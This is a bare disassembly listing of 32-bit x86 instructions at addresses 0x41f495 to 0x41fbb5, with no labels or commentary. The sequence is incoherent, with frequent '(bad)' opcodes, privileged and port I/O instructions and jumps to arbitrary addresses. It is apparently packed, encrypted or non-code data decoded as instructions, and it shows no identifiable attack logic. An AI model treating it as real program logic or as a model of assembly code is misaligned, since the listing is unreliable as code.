  41f495:	retf   0xf080
  41f498:	pop    ebx
  41f499:	adc    DWORD PTR [edi-0x13],ebp
  41f49c:	cmp    eax,0xac26ed12
  41f4a1:	adc    ah,dl
  41f4a3:	nop
  41f4a4:	stc    
  41f4a5:	rol    ecx,cl
  41f4a7:	loope  0x41f45c
  41f4a9:	es jmp 0x41f4b7
  41f4ac:	cmc    
  41f4ad:	mov    bl,0x2b
  41f4af:	cmp    ebx,DWORD PTR [edx]
  41f4b1:	sbb    cl,0xd0
  41f4b4:	popa   
  41f4b5:	pop    ds
  41f4b6:	call   0x372a688c
  41f4bb:	icebp  
  41f4bc:	ror    DWORD PTR [esi+0x7d],0xce
  41f4c0:	fsub   st,st(2)
  41f4c2:	sub    bh,al
  41f4c4:	mov    dl,0x4
  41f4c6:	dec    ebx
  41f4c7:	xchg   ecx,eax
  41f4c8:	addr16 mov al,ds:0xe3c7
  41f4cc:	pop    eax
  41f4cd:	dec    edi
  41f4ce:	sub    ch,BYTE PTR [ebx]
  41f4d0:	sub    al,BYTE PTR [ebx+0x6f]
  41f4d3:	push   0x7
  41f4d5:	dec    ebx
  41f4d6:	dec    ecx
  41f4d7:	popa   
  41f4d8:	mov    esp,0xd65e82ce
  41f4dd:	jecxz  0x41f505
  41f4df:	xchg   DWORD PTR [esi+0x34],edx
  41f4e2:	mov    bh,0x20
  41f4e4:	dec    ebp
  41f4e5:	addr16 aad 0xb
  41f4e8:	cmp    bh,BYTE PTR [ebx+0x3e]
  41f4eb:	inc    esi
  41f4ec:	sub    DWORD PTR [edx+0x2],eax
  41f4ef:	adc    eax,esp
  41f4f1:	mov    DWORD PTR [ebx-0x12],ebp
  41f4f4:	adc    ebp,DWORD PTR es:[ebx]
  41f4f7:	xchg   ecx,eax
  41f4f8:	sub    DWORD PTR [ebx+eax*1],edx
  41f4fb:	inc    eax
  41f4fc:	add    al,BYTE PTR [eax+0x5b]
  41f4ff:	add    eax,0x859bef01
  41f504:	cli    
  41f505:	sbb    eax,0xfe40a6fe
  41f50a:	ins    DWORD PTR es:[edi],dx
  41f50b:	and    al,0x4f
  41f50d:	cli    
  41f50e:	xchg   esp,eax
  41f50f:	push   edi
  41f510:	test   eax,0xcd1eee2
  41f515:	in     al,dx
  41f516:	repnz cli 
  41f518:	inc    esi
  41f519:	pop    ss
  41f51a:	ret    
  41f51b:	xor    edx,DWORD PTR [ecx+0x29]
  41f51e:	ins    DWORD PTR es:[edi],dx
  41f51f:	and    eax,0xad2b51c0
  41f524:	mov    ch,0xa3
  41f526:	out    0xc,eax
  41f528:	xor    al,0xd2
  41f52a:	jns    0x41f51f
  41f52c:	stc    
  41f52d:	dec    ebp
  41f52e:	push   esp
  41f52f:	or     eax,0xf3fcc380
  41f534:	and    edi,DWORD PTR [ebx+0x3c]
  41f537:	dec    ecx
  41f538:	mov    bh,0x3a
  41f53a:	mov    edx,0x10218209
  41f53f:	bound  eax,QWORD PTR [ebx-0x3c86cb32]
  41f545:	fnsave [ebx]
  41f547:	mov    edi,0x127ac5de
  41f54c:	mov    DWORD PTR es:[ebx-0x311e4580],edx
  41f553:	pop    ss
  41f554:	pop    esp
  41f555:	and    eax,0x68d21dd3
  41f55a:	cmp    ah,BYTE PTR [edx+0x43]
  41f55d:	fmul   QWORD PTR [ebp-0x18]
  41f560:	sahf   
  41f561:	add    ch,BYTE PTR ds:0xb8342076
  41f567:	pop    edx
  41f568:	mul    DWORD PTR [edx+0x55]
  41f56b:	push   ebx
  41f56c:	imul   ebx,DWORD PTR [eax+0x3a],0x33
  41f570:	push   ebx
  41f571:	scas   al,BYTE PTR es:[edi]
  41f572:	adc    dl,BYTE PTR [ebx-0x6d]
  41f575:	xchg   ebx,eax
  41f576:	fs iret 
  41f578:	jb     0x41f5d1
  41f57a:	mov    edx,0xf6f32f64
  41f57f:	xchg   esp,eax
  41f580:	dec    ebp
  41f581:	fidiv  DWORD PTR [edi]
  41f583:	mov    ebp,0xb1121665
  41f588:	hlt    
  41f589:	pop    ebx
  41f58a:	push   ds
  41f58b:	stos   BYTE PTR es:[edi],al
  41f58c:	mov    DWORD PTR [edi-0x5e],edx
  41f58f:	jp     0x41f526
  41f591:	mov    ds:0xd0354d4d,eax
  41f596:	push   ds
  41f597:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f598:	in     al,dx
  41f599:	out    dx,al
  41f59a:	aam    0xdc
  41f59c:	lea    edx,[edx+ebx*1]
  41f59f:	fldenv [edx]
  41f5a1:	in     eax,dx
  41f5a2:	(bad)  
  41f5a4:	xchg   ebx,eax
  41f5a5:	xchg   ecx,eax
  41f5a6:	xchg   ecx,eax
  41f5a7:	(bad)  
  41f5a9:	test   eax,0x88fdb085
  41f5ae:	and    BYTE PTR ds:0x994df59b,bl
  41f5b4:	jmp    0xd84f3f47
  41f5b9:	data16 std 
  41f5bb:	hlt    
  41f5bc:	scas   al,BYTE PTR es:[edi]
  41f5bd:	scas   eax,DWORD PTR es:[edi]
  41f5be:	out    0x11,eax
  41f5c0:	push   ss
  41f5c1:	loop   0x41f5a1
  41f5c3:	mov    edi,0x1c8f1b4b
  41f5c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f5c9:	rcl    DWORD PTR [ecx-0x58],0xb0
  41f5cd:	shl    ah,0xfe
  41f5d0:	int    0x28
  41f5d2:	cmp    esi,DWORD PTR [edi-0x4d]
  41f5d5:	xchg   esp,eax
  41f5d6:	sbb    ebp,DWORD PTR [eax+edi*2+0x34141a96]
  41f5dd:	ror    BYTE PTR [esi],0x4c
  41f5e0:	cmp    esi,eax
  41f5e2:	lods   eax,DWORD PTR ds:[esi]
  41f5e3:	inc    edx
  41f5e4:	push   ds
  41f5e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f5e6:	cmp    al,0x49
  41f5e8:	outs   dx,DWORD PTR ds:[esi]
  41f5e9:	cmc    
  41f5ea:	jnp    0x41f612
  41f5ec:	cs pop eax
  41f5ee:	add    bh,BYTE PTR [esi]
  41f5f0:	arpl   WORD PTR [eax+0x29],bp
  41f5f3:	add    edi,DWORD PTR [edx+0x1d2a2e30]
  41f5f9:	push   edx
  41f5fa:	jo     0x41f669
  41f5fc:	jecxz  0x41f616
  41f5fe:	pop    edi
  41f5ff:	jp     0x41f619
  41f601:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f602:	or     eax,0x9a822894
  41f607:	mov    bl,0xd3
  41f609:	cmp    eax,0x4778c5ab
  41f60e:	mov    edx,cr4
  41f611:	mov    ds:0xab237944,al
  41f616:	xor    edi,DWORD PTR [ecx]
  41f618:	call   0xbf53:0xc10f2726
  41f61f:	outs   dx,DWORD PTR ds:[esi]
  41f620:	out    0xea,al
  41f622:	stos   BYTE PTR es:[edi],al
  41f623:	out    0xf8,al
  41f625:	lahf   
  41f626:	jp     0x41f621
  41f628:	call   0xb8063f1
  41f62d:	outs   dx,BYTE PTR ds:[esi]
  41f62e:	dec    edi
  41f62f:	add    DWORD PTR [ebx+0x52],edx
  41f632:	add    ecx,DWORD PTR [esi+0x5d]
  41f635:	dec    ecx
  41f636:	cwde   
  41f637:	test   al,0xc3
  41f639:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f63a:	int3   
  41f63b:	les    ecx,FWORD PTR [eax+0x7f]
  41f63e:	shr    BYTE PTR ss:[ebp-0x6decfac2],1
  41f645:	int3   
  41f646:	and    al,0x52
  41f648:	(bad)  
  41f649:	jno    0x41f63a
  41f64b:	daa    
  41f64c:	por    mm5,mm4
  41f64f:	out    0x22,eax
  41f651:	push   ebp
  41f652:	push   eax
  41f653:	(bad)  
  41f654:	inc    eax
  41f655:	neg    DWORD PTR [ebp+0x57305f39]
  41f65b:	inc    esi
  41f65c:	adc    ecx,DWORD PTR [edx+0x26]
  41f65f:	adc    al,0xaa
  41f661:	cmp    BYTE PTR [eax],dh
  41f663:	iret   
  41f664:	fidivr WORD PTR [eax+0x2cb623df]
  41f66a:	test   BYTE PTR [ebx+0x46],ah
  41f66d:	mov    BYTE PTR [ebx],cl
  41f66f:	push   esp
  41f670:	dec    ecx
  41f671:	mov    bl,0x95
  41f673:	xchg   edi,eax
  41f674:	pop    esi
  41f675:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f676:	repnz xchg edx,eax
  41f678:	add    BYTE PTR ds:0x8a19b37c,0xb4
  41f67f:	jo     0x41f629
  41f681:	pop    esp
  41f682:	jns    0x41f62d
  41f684:	cli    
  41f685:	test   BYTE PTR [edx+0x3d],ch
  41f688:	arpl   WORD PTR [ecx],sp
  41f68a:	fs pop ss
  41f68c:	push   cs
  41f68d:	mov    cs,WORD PTR [edi+0x48ab8f1b]
  41f693:	add    edx,DWORD PTR [eax+eiz*4-0x7d775b1c]
  41f69a:	les    esp,FWORD PTR [ebx-0x792baca5]
  41f6a0:	pop    esi
  41f6a1:	xchg   esi,eax
  41f6a2:	adc    BYTE PTR [ecx+eax*8+0x7b01177],0x57
  41f6aa:	in     eax,0x7b
  41f6ac:	mov    esi,0xee6f2724
  41f6b1:	inc    esp
  41f6b2:	jne    0x41f652
  41f6b4:	pop    edx
  41f6b5:	mov    al,0xb
  41f6b7:	data16 lods al,BYTE PTR ds:[esi]
  41f6b9:	out    dx,eax
  41f6ba:	add    al,0xcd
  41f6bc:	mov    bl,0x5e
  41f6be:	adc    ecx,DWORD PTR [edi+0x175451b7]
  41f6c4:	mov    edi,0xf882e1b8
  41f6c9:	or     esp,DWORD PTR [eax]
  41f6cb:	pop    edx
  41f6cc:	retf   
  41f6cd:	jb     0x41f6d1
  41f6cf:	sub    BYTE PTR [edx+0x54a85be5],dl
  41f6d5:	call   0x3e00521c
  41f6da:	xchg   BYTE PTR [ecx],ch
  41f6dc:	shl    edi,cl
  41f6de:	addr16 xor edi,esp
  41f6e1:	cwde   
  41f6e2:	bound  edx,QWORD PTR [eax+0x66]
  41f6e5:	pop    ds
  41f6e6:	push   eax
  41f6e7:	jo     0x41f68e
  41f6e9:	(bad)  
  41f6ea:	mov    bh,0xa6
  41f6ec:	icebp  
  41f6ed:	(bad)  
  41f6ee:	out    dx,eax
  41f6ef:	pop    es
  41f6f0:	test   eax,0x8471fa76
  41f6f5:	sbb    al,0x52
  41f6f7:	adc    dh,BYTE PTR [eax+0x7f]
  41f6fa:	inc    ecx
  41f6fb:	mov    eax,ds:0xf6d18957
  41f700:	or     al,0x11
  41f702:	add    BYTE PTR [edx],bl
  41f704:	ins    BYTE PTR es:[edi],dx
  41f705:	dec    ecx
  41f706:	hlt    
  41f707:	mov    esi,0x2ecf355
  41f70c:	sbb    al,0x17
  41f70e:	sub    DWORD PTR [esi+0x63],edx
  41f711:	dec    ecx
  41f712:	mov    ds:0xc6e00f80,eax
  41f717:	cmp    al,0x7
  41f719:	unpcklps xmm0,XMMWORD PTR [ebp+0x36]
  41f71d:	or     eax,0xb0714f48
  41f722:	inc    edi
  41f723:	cmp    eax,0x4e1c16d2
  41f728:	mov    ebx,0xa04b3c92
  41f72d:	or     eax,0x3729cb55
  41f732:	pop    esi
  41f733:	inc    ebx
  41f734:	retf   
  41f735:	cwde   
  41f736:	pushf  
  41f737:	loope  0x41f6ba
  41f739:	mov    edi,0x846beaf8
  41f73e:	sub    eax,DWORD PTR [ecx+0x24b3dd74]
  41f744:	mov    dl,0xfc
  41f747:	jl     0x41f78a
  41f749:	xchg   edi,eax
  41f74a:	pop    es
  41f74b:	cdq    
  41f74c:	inc    edi
  41f74d:	sub    BYTE PTR [eax-0x61854db9],ah
  41f753:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f754:	sub    BYTE PTR [esi+ebx*2-0x8c4c81c],0x25
  41f75c:	xchg   ebx,eax
  41f75d:	and    al,0x2
  41f75f:	nop
  41f760:	sbb    DWORD PTR [ecx],0x81238504
  41f766:	retf   0x8a33
  41f769:	and    DWORD PTR [ebp-0x6202186a],ecx
  41f76f:	and    edx,eax
  41f771:	je     0x41f77f
  41f773:	mov    eax,ds:0xbb7bff6d
  41f778:	rol    DWORD PTR [edi+0x60],0xa5
  41f77c:	or     BYTE PTR [esi-0x4e],ch
  41f77f:	daa    
  41f780:	ins    BYTE PTR es:[edi],dx
  41f781:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f782:	(bad)  
  41f783:	mov    esp,0x8834616f
  41f788:	mov    ds:0x79ed618e,eax
  41f78d:	repz xchg ebx,eax
  41f78f:	push   ebx
  41f790:	adc    al,0xd1
  41f792:	stos   BYTE PTR es:[edi],al
  41f793:	sti    
  41f794:	mov    cl,0x71
  41f796:	and    ah,BYTE PTR [edx*2+0x19c6a3a6]
  41f79d:	test   DWORD PTR [ecx],eax
  41f79f:	rol    bh,1
  41f7a1:	jmp    0xbccb:0xc5e53be1
  41f7a8:	ret    0x5b5f
  41f7ab:	stos   DWORD PTR es:[edi],eax
  41f7ac:	dec    ecx
  41f7ad:	mov    eax,ds:0x1d6bcc5c
  41f7b2:	xrelease xchg BYTE PTR [eax+0x547daded],ch
  41f7b9:	nop
  41f7ba:	cmp    bh,BYTE PTR [eiz*8+0x72407c8]
  41f7c1:	adc    al,BYTE PTR [edx+0x7fedfc3c]
  41f7c7:	and    dl,BYTE PTR [ecx-0x63af2f6c]
  41f7cd:	add    eax,0x8264c8f8
  41f7d2:	iret   
  41f7d3:	dec    ebp
  41f7d4:	xor    DWORD PTR [ebx-0xcd40de0],esi
  41f7da:	mov    edi,0x3af75141
  41f7df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f7e0:	sar    BYTE PTR [edi],0xe2
  41f7e3:	retf   
  41f7e4:	neg    dl
  41f7e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f7e7:	in     eax,dx
  41f7e8:	jno    0x41f83b
  41f7ea:	push   eax
  41f7eb:	mov    ss,ebx
  41f7ed:	outs   dx,DWORD PTR ds:[esi]
  41f7ee:	jae    0x41f841
  41f7f0:	mov    dh,0x8e
  41f7f2:	sub    ecx,DWORD PTR [eax+0xce8ad85]
  41f7f8:	xchg   edi,eax
  41f7f9:	fs repnz pushf 
  41f7fc:	cli    
  41f7fd:	or     eax,0x115d3b96
  41f802:	pop    eax
  41f803:	jns    0x41f80a
  41f805:	loope  0x41f880
  41f807:	push   ds
  41f808:	dec    ecx
  41f809:	dec    eax
  41f80a:	sbb    eax,0x4813c1c7
  41f80f:	mov    eax,0xfa527f7d
  41f814:	imul   edi,edx,0x7
  41f817:	rcr    BYTE PTR [edx+ebx*2-0x60],0xf9
  41f81c:	mov    ds:0xc6e95bcd,eax
  41f821:	mov    ebp,0xda56b602
  41f826:	clc    
  41f827:	clc    
  41f828:	inc    DWORD PTR [ebx-0x74]
  41f82b:	adc    DWORD PTR [ebp+0x64962e2e],ebx
  41f831:	enter  0xfea6,0x3c
  41f835:	shr    BYTE PTR ss:[edx-0x31],1
  41f839:	push   edx
  41f83a:	mov    es,WORD PTR [esi+0x7cb1d291]
  41f840:	aam    0xd
  41f842:	sbb    ebp,DWORD PTR [edi-0xf]
  41f845:	and    edx,edi
  41f847:	xchg   ebx,eax
  41f848:	xor    eax,0xf00a85c9
  41f84d:	imul   ebp,DWORD PTR [ebp+0x3f20d69b],0x80c43ca2
  41f857:	and    al,0x14
  41f859:	xor    dl,BYTE PTR [edx-0x6e03995e]
  41f85f:	push   eax
  41f860:	pop    ebp
  41f861:	xchg   esp,eax
  41f862:	repz adc al,0x27
  41f865:	pop    ecx
  41f866:	pop    esp
  41f867:	in     eax,dx
  41f868:	add    al,0x3
  41f86a:	jo     0x41f8d0
  41f86c:	loopne 0x41f7f4
  41f86e:	call   DWORD PTR [edx+0x76e752c]
  41f874:	in     eax,0xc3
  41f876:	adc    DWORD PTR [eax+0x59],ecx
  41f879:	push   ds
  41f87a:	stos   BYTE PTR es:[edi],al
  41f87b:	(bad)  
  41f87c:	adc    edi,DWORD PTR [edi-0x52]
  41f87f:	mov    dh,0x68
  41f881:	outs   dx,BYTE PTR ds:[esi]
  41f882:	sahf   
  41f883:	xchg   edi,eax
  41f884:	loopne 0x41f8b3
  41f886:	push   eax
  41f887:	das    
  41f888:	retf   0x31cb
  41f88b:	add    ebp,DWORD PTR [esi-0x13]
  41f88e:	loope  0x41f86d
  41f890:	ficomp WORD PTR [edi]
  41f892:	pop    DWORD PTR [esi-0x18]
  41f895:	mov    bh,0xbf
  41f897:	mov    cl,0xa6
  41f899:	xchg   ebx,eax
  41f89a:	pop    ds
  41f89b:	mov    ch,0xf2
  41f89d:	xchg   esi,eax
  41f89e:	adc    DWORD PTR [edi-0x6a],esi
  41f8a1:	xchg   esp,eax
  41f8a2:	inc    ebx
  41f8a3:	and    eax,0x2747a2ae
  41f8a8:	ja     0x41f897
  41f8aa:	in     al,0xcf
  41f8ac:	ror    ebx,cl
  41f8ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f8af:	lds    edx,FWORD PTR [ebx-0x1f]
  41f8b2:	push   esi
  41f8b3:	inc    ebx
  41f8b4:	sub    edx,DWORD PTR [ebp+0x4ca3fb0d]
  41f8ba:	prefetcht1 BYTE PTR [ecx-0x3bb7d46a]
  41f8c1:	sbb    DWORD PTR [edx-0x5a],ebp
  41f8c4:	inc    ebx
  41f8c5:	dec    esi
  41f8c6:	push   ecx
  41f8c7:	inc    edx
  41f8c8:	and    eax,0xe8d41939
  41f8cd:	jg     0x41f88c
  41f8cf:	xor    BYTE PTR ds:0x7d4aebfd,bl
  41f8d5:	mul    dh
  41f8d7:	ins    DWORD PTR es:[edi],dx
  41f8d8:	and    eax,0x88a0fec3
  41f8dd:	sbb    ecx,esp
  41f8df:	cdq    
  41f8e0:	cmp    ecx,DWORD PTR [esi+ebx*8]
  41f8e3:	sbb    DWORD PTR [esi+eax*2+0x60179c75],ebp
  41f8ea:	sub    BYTE PTR [ecx-0x24],al
  41f8ed:	in     al,0x65
  41f8ef:	rcr    BYTE PTR [edi],cl
  41f8f1:	inc    edi
  41f8f2:	pop    ecx
  41f8f3:	push   es
  41f8f4:	lds    ebp,FWORD PTR [esi+0x3e3fc3ef]
  41f8fa:	inc    edi
  41f8fb:	test   BYTE PTR [eax],ah
  41f8fd:	(bad)  
  41f8fe:	cmp    BYTE PTR [edi+0x8f1b92c],ah
  41f904:	sub    dl,BYTE PTR [edx+0x57]
  41f907:	mov    ah,0xcb
  41f909:	adc    ebx,DWORD PTR ss:[esi-0x79d157dc]
  41f910:	sub    eax,DWORD PTR [edi-0x5c2f5193]
  41f916:	mov    eax,ss:0xe98189ba
  41f91c:	ins    DWORD PTR es:[edi],dx
  41f91d:	add    bh,ah
  41f91f:	int    0x9d
  41f921:	repnz xchg edi,eax
  41f923:	cwde   
  41f924:	cmp    esi,esi
  41f926:	and    dh,BYTE PTR [edi]
  41f928:	jmp    DWORD PTR [edi]
  41f92a:	pop    edx
  41f92b:	into   
  41f92c:	adc    eax,0x346763c6
  41f931:	out    dx,al
  41f932:	jbe    0x41f93b
  41f934:	jge    0x41f965
  41f936:	stc    
  41f937:	push   0xffffffd5
  41f939:	outs   dx,DWORD PTR ds:[esi]
  41f93a:	pop    ebx
  41f93b:	xchg   ecx,eax
  41f93c:	call   0x268d:0x748699c2
  41f943:	cmp    BYTE PTR [edi+ebp*4+0x1a],al
  41f947:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f948:	lock and BYTE PTR [esi+0x6302cd1c],dl
  41f94f:	ja     0x41f989
  41f951:	push   ebp
  41f952:	or     al,al
  41f954:	stos   DWORD PTR es:[edi],eax
  41f955:	call   0xb1ca3d7e
  41f95a:	jle    0x41f9c7
  41f95c:	(bad)  
  41f95d:	jne    0x41f9a1
  41f95f:	cdq    
  41f960:	jl     0x41f98d
  41f962:	pop    ecx
  41f963:	jb     0x41f94c
  41f965:	sub    esp,DWORD PTR [ebp+0x51]
  41f968:	push   0xffffffab
  41f96a:	scas   eax,DWORD PTR es:[edi]
  41f96b:	scas   al,BYTE PTR es:[edi]
  41f96c:	(bad)  
  41f96d:	jb     0x41f96d
  41f96f:	shr    DWORD PTR [ecx],1
  41f971:	and    ch,BYTE PTR [edx-0x69]
  41f974:	rol    edx,0xce
  41f977:	adc    DWORD PTR [eiz*8-0x81aa3a9],0xffffffef
  41f97f:	fucom  st(3)
  41f981:	call   0xd9a32cbf
  41f986:	bound  esi,QWORD PTR [esi+0x39]
  41f989:	xchg   dh,ah
  41f98b:	adc    bl,BYTE PTR [ebp-0x4d05675e]
  41f991:	sar    dh,cl
  41f993:	pusha  
  41f994:	and    al,0x2f
  41f996:	pop    eax
  41f997:	fist   WORD PTR [edx]
  41f999:	rcl    eax,0x8b
  41f99c:	fs ins BYTE PTR es:[edi],dx
  41f99e:	sbb    DWORD PTR [edi],edi
  41f9a0:	xchg   BYTE PTR [ebp-0x19],dh
  41f9a3:	adc    BYTE PTR [eax+0x4d7acdaf],al
  41f9a9:	jb     0x41f9b1
  41f9ab:	or     BYTE PTR [eax+0x392c720d],bl
  41f9b1:	dec    ecx
  41f9b2:	and    BYTE PTR [ecx],bl
  41f9b4:	data16 sbb al,0xac
  41f9b7:	xchg   ebx,eax
  41f9b8:	mov    eax,DWORD PTR [esp+ebp*8]
  41f9bb:	fldenv [edx+0x7e]
  41f9be:	xlat   BYTE PTR ds:[ebx]
  41f9bf:	bound  edx,QWORD PTR [edi-0x243960a3]
  41f9c5:	push   es
  41f9c6:	push   esp
  41f9c7:	inc    ebp
  41f9c8:	mov    bl,0xd1
  41f9ca:	mov    ch,dh
  41f9cc:	lods   eax,DWORD PTR ds:[esi]
  41f9cd:	xchg   edx,eax
  41f9ce:	mov    DWORD PTR [ebp+0x4dd593e7],ecx
  41f9d4:	pop    ecx
  41f9d5:	mov    esp,DWORD PTR [edx+0x7a]
  41f9d8:	pop    esi
  41f9d9:	and    al,0x46
  41f9db:	and    al,0xe6
  41f9dd:	sbb    BYTE PTR [edi-0x2c],ch
  41f9e0:	test   BYTE PTR [ebx+0x62aa4f1e],bl
  41f9e6:	fadd   QWORD PTR [eax+0x7e043dac]
  41f9ec:	idiv   BYTE PTR [eax+0x1d]
  41f9ef:	mov    al,0x24
  41f9f1:	rcr    DWORD PTR [edi-0x36c3d614],0x9
  41f9f8:	xor    eax,0x8ff49641
  41f9fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f9fe:	mov    al,0x9a
  41fa00:	sar    ah,0xd3
  41fa03:	leave  
  41fa04:	addr16 es pop esi
  41fa07:	cdq    
  41fa08:	dec    edi
  41fa09:	xchg   esi,eax
  41fa0a:	jg     0x41fa23
  41fa0c:	adc    al,0x28
  41fa0e:	xchg   edi,eax
  41fa0f:	popa   
  41fa10:	push   cs
  41fa11:	cmp    eax,0xddf2edb4
  41fa16:	test   BYTE PTR [ecx+0x45],ch
  41fa19:	jno    0x41f9b8
  41fa1b:	cmp    ebp,DWORD PTR [ebx+esi*1+0x15]
  41fa1f:	mov    ah,0x15
  41fa21:	mov    esp,cs
  41fa23:	fstp   DWORD PTR gs:[esp+edx*2]
  41fa27:	rol    BYTE PTR [ebp-0x78],cl
  41fa2a:	jle    0x41fa3f
  41fa2c:	or     BYTE PTR [eax],dl
  41fa2e:	sti    
  41fa2f:	mov    al,ds:0x31ef6102
  41fa34:	add    al,0x88
  41fa36:	rcl    bh,1
  41fa38:	fild   QWORD PTR [edi+0x2d]
  41fa3b:	out    dx,eax
  41fa3c:	add    ebx,DWORD PTR [ebx]
  41fa3e:	and    dh,BYTE PTR [ecx]
  41fa40:	int3   
  41fa41:	sar    esp,0x6e
  41fa44:	mov    ebx,0x345235d
  41fa49:	add    bh,BYTE PTR [eax]
  41fa4b:	gs sub edi,ecx
  41fa4e:	loope  0x41fab2
  41fa50:	inc    ecx
  41fa51:	cmp    bl,cl
  41fa53:	fidivr WORD PTR [ebx+ebx*1-0x7e01ebf]
  41fa5a:	mov    bl,0x7d
  41fa5c:	push   0x8fa27776
  41fa61:	outs   dx,BYTE PTR ds:[esi]
  41fa62:	adc    al,0x6f
  41fa64:	xor    bh,BYTE PTR ds:0x8349840f
  41fa6a:	stos   BYTE PTR es:[edi],al
  41fa6b:	xchg   esp,eax
  41fa6c:	jecxz  0x41f9fd
  41fa6e:	(bad)  
  41fa6f:	mov    bh,0x25
  41fa71:	and    dl,BYTE PTR [edx]
  41fa73:	into   
  41fa74:	out    dx,eax
  41fa75:	xor    BYTE PTR ds:0x93a3a625,0x77
  41fa7c:	sub    DWORD PTR [edx+0x36],ebx
  41fa7f:	jmp    0xa1ad:0x7a49a052
  41fa86:	stos   BYTE PTR es:[edi],al
  41fa87:	sahf   
  41fa88:	es push es
  41fa8a:	cmp    ebx,edi
  41fa8c:	xchg   edi,eax
  41fa8d:	sbb    ebp,edi
  41fa8f:	adc    eax,0xe48c9965
  41fa94:	jbe    0x41fa5a
  41fa96:	daa    
  41fa97:	je     0x41fa77
  41fa99:	ror    BYTE PTR [edi],1
  41fa9b:	loopne 0x41fb03
  41fa9d:	dec    ecx
  41fa9e:	or     DWORD PTR [ecx],ebx
  41faa0:	shl    BYTE PTR [edi+0x4ee9225],0xae
  41faa7:	or     ebp,DWORD PTR [ecx+0x44de245]
  41faad:	xlat   BYTE PTR ds:[ebx]
  41faae:	pavgb  mm7,QWORD PTR [ecx]
  41fab1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fab2:	call   0xf2804d71
  41fab7:	sbb    al,BYTE PTR [esi+ebx*8+0x5f6404f4]
  41fabe:	push   edx
  41fabf:	idiv   BYTE PTR [ecx+0x48]
  41fac2:	inc    edi
  41fac3:	mov    cs,WORD PTR [esi+0x12047b1e]
  41fac9:	cdq    
  41faca:	into   
  41facb:	sahf   
  41facc:	add    eax,0x1558ac28
  41fad1:	daa    
  41fad2:	mul    BYTE PTR [edi+0x10fe2263]
  41fad8:	pop    edx
  41fad9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fada:	nop
  41fadb:	ss sbb cl,dl
  41fade:	mov    ch,0x94
  41fae0:	sub    DWORD PTR [edx-0x2dcefb7d],edx
  41fae6:	and    bl,BYTE PTR [esi]
  41fae8:	add    cl,bh
  41faea:	lods   al,BYTE PTR ds:[esi]
  41faeb:	jne    0x41fb20
  41faed:	std    
  41faee:	mov    BYTE PTR [eax-0x65936da],bl
  41faf4:	aas    
  41faf5:	xor    ebp,edx
  41faf7:	and    al,0x9c
  41faf9:	push   cs
  41fafa:	loope  0x41faf5
  41fafc:	push   0x123b6845
  41fb01:	pop    ebp
  41fb02:	test   al,0x9
  41fb04:	rol    BYTE PTR [edx-0x1f],0xa0
  41fb08:	fadd   DWORD PTR [ecx-0x69092591]
  41fb0e:	push   ebp
  41fb0f:	or     eax,0x835344d4
  41fb14:	jb     0x41faf2
  41fb16:	lods   al,BYTE PTR fs:[esi]
  41fb18:	jb     0x41faf6
  41fb1a:	inc    edi
  41fb1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fb1c:	mov    eax,0x47a2e354
  41fb21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fb22:	xor    eax,0xe52af927
  41fb27:	dec    ebp
  41fb28:	mov    ds,WORD PTR [eax+0x34ca83c3]
  41fb2e:	(bad)  
  41fb30:	movzx  edi,BYTE PTR [esi-0x2dcd693e]
  41fb37:	mov    dl,0x33
  41fb39:	cli    
  41fb3a:	pop    ds
  41fb3b:	popf   
  41fb3c:	fisub  DWORD PTR fs:[edi]
  41fb3f:	xor    edi,esi
  41fb41:	(bad)  
  41fb42:	scas   al,BYTE PTR es:[edi]
  41fb43:	mov    dh,0xd4
  41fb45:	jecxz  0x41fb74
  41fb47:	dec    edi
  41fb48:	int    0x2c
  41fb4a:	and    eax,0xde3a5d71
  41fb4f:	or     BYTE PTR [edx],al
  41fb51:	jbe    0x41faf2
  41fb53:	imul   esp,DWORD PTR [esi-0x21],0x4d89e462
  41fb5a:	mov    ds:0x6cbab86d,al
  41fb5f:	xchg   esp,eax
  41fb60:	cmc    
  41fb61:	inc    ebx
  41fb62:	adc    BYTE PTR [edi+0x425fda4a],dh
  41fb68:	sbb    edi,DWORD PTR [ebx-0x42]
  41fb6b:	das    
  41fb6c:	rcl    BYTE PTR [ecx+edi*1-0x4],cl
  41fb70:	adc    al,0x2c
  41fb72:	dec    ebx
  41fb73:	outs   dx,DWORD PTR ds:[esi]
  41fb74:	sub    BYTE PTR [edi],al
  41fb76:	sub    ah,ch
  41fb78:	xchg   ebp,eax
  41fb79:	das    
  41fb7a:	mov    DWORD PTR [eax-0x59],edx
  41fb7d:	jg     0x41fb57
  41fb7f:	mov    dl,0xf6
  41fb81:	cmp    BYTE PTR [ecx-0x57a5500e],bl
  41fb87:	jno    0x41fb1e
  41fb89:	push   0xb3a5efec
  41fb8e:	loopne 0x41fbd6
  41fb90:	in     al,dx
  41fb91:	jnp    0x41fb7d
  41fb93:	sahf   
  41fb94:	xchg   ecx,eax
  41fb95:	(bad)  
  41fb96:	jns    0x41fbc0
  41fb98:	pop    es
  41fb99:	xchg   edi,eax
  41fb9a:	inc    esi
  41fb9b:	xor    dl,BYTE PTR [ecx-0x1a]
  41fb9e:	jecxz  0x41fb55
  41fba0:	fiadd  WORD PTR [esi+0x3a]
  41fba3:	popf   
  41fba4:	loopne 0x41fb63
  41fba6:	or     dl,al
  41fba8:	and    al,0xa6
  41fbaa:	adc    al,0xd1
  41fbac:	fstp   DWORD PTR [edi]
  41fbae:	push   ebp
  41fbaf:	fisttp QWORD PTR [ebx+0x5d4e8d61]
  41fbb5:	mov    BYTE PTR [esi+0x3d9209fc],bl
